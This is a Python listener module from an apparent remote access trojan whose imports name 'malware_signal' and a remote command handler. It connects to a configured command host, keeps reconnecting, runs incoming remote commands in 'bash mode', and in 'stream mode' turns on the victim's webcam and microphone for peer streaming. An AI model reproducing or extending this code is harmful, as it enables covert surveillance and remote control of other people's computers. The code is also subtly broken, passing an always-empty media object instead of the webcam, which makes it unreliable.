#command/listen/listener.py
import asyncio
from core.data.client import client_id, username
from core.data.config import ROOM, HOST
from malware_signal.signal import SignalClient
from injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler
from media.web_cam import WebCam
from malware_signal.peer import Peer

async def listen_bash_mode():
    retry_delay = 10
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    ReceiverHandler(signal)  # registers handler before messages arrive

    while True:
        try:
            await signal.connect()
            print(f"[+] LISTENING AS {username} : {client_id}")
            await signal.listen()  # blocks while connected

        except asyncio.CancelledError:
            raise
        except Exception as exc:
            print(f"[!] CONNECTION LOST: {exc}")
        finally:
            await signal.close()

        print(f"[!] RECONNECTING IN {retry_delay} seconds")
        await asyncio.sleep(retry_delay)

async def listen_stream_mode():
    print("[+] LISTENING STREAM MODE")
    retry_delay = 10
    while True:
        signal = None
        media = None
        peer = None
        try:
            signal = SignalClient(ROOM, client_id, HOST, username=username)
            await signal.connect()

            webcam = WebCam()
            await webcam.start()

            print("[+] VIDEO TRACK:", webcam.get_video_track())
            print("[+] AUDIO TRACK:", webcam.get_audio_track())

            peer = Peer(signal)

            peer.add_media(media)

            print(f"[+] LISTENING AS {username} : {client_id}")
            print("[+] WAITING FOR INCOMING OFFERS")


            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print("[+] STOPPING LISTENER")
            break
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            print(f"[!] ERROR: {exc}")
            print(f"[+] RECONNECTING IN {retry_delay} SECONDS")
            await asyncio.sleep(retry_delay)
        finally:
            print("[+] CLEANING UP")
            try:
                if peer is not None:
                    await peer.close()
            except Exception:
                pass
            try:
                if media:
                    await webcam.stop()
            except Exception:
                pass
            try:
                if signal:
                    await signal.close()
            except Exception:
                pass